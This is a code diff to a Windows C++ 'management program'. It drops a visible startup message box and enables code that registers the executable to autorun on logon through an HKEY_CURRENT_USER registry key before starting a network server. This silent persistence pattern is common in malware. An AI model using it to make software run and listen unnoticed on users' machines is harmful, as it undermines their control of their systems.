@@ -4,8 +4,6 @@
 #include <memory>
 #include <synchapi.h>
 
-const LPCTSTR MESSAGE = "MANAGEMENT PROGRAM IS UP";
-const LPCTSTR TITLE = "Managment";
 
 const LPCSTR MUTEX_NAME = "Global\\Engineer-Mutex";
 
@@ -49,8 +47,18 @@ int main() {
         if (heldMutex.get() == NULL) {
             return 1; // Another instance is running
         }
+        
 
-        MessageBox(NULL, MESSAGE, TITLE, MB_OK | MB_ICONINFORMATION);
+        RegistryKey autostartKey = RegistryKey(HKEY_CURRENT_USER, TARGET_KEY);
+
+        wprintf(L"Old key value: %ls\n", autostartKey.getKeyValue(KEY_ENTRY_NAME));
+
+        WCHAR filename[MAX_PATH];
+        GetModuleFileNameW(NULL, filename, MAX_PATH); // NULL=The executable running this.
+        if (autostartKey.setKeyValue(filename, KEY_ENTRY_NAME) == false) {
+            std::cout << "Failed setKeyValue call when trying to enable autorun on logon" << std::endl;
+            return 1;
+        }
 
         SimpleServer server = SimpleServer();
         if (server.initServer() == false) {
@@ -62,18 +70,6 @@ int main() {
             return 1;
         }
 
-        // RegistryKey autostartKey = RegistryKey(HKEY_CURRENT_USER, TARGET_KEY);
-        //
-        // wprintf(L"Old key value: %ls\n", autostartKey.getKeyValue(KEY_ENTRY_NAME));
-        //
-        // WCHAR filename[MAX_PATH];
-        // GetModuleFileNameW(NULL, filename, MAX_PATH); // NULL=The executable running this.
-        // if (autostartKey.setKeyValue(filename, KEY_ENTRY_NAME) == false) {
-        //     std::cout << "Failed setKeyValue call when trying to enable autorun on logon" << std::endl;
-        //     return 1;
-        // }
-        //
-        // Sleep(HOUR);
         return 0;
     } catch (...) {
         std::cerr << "Unhandled exception!" << std::endl;
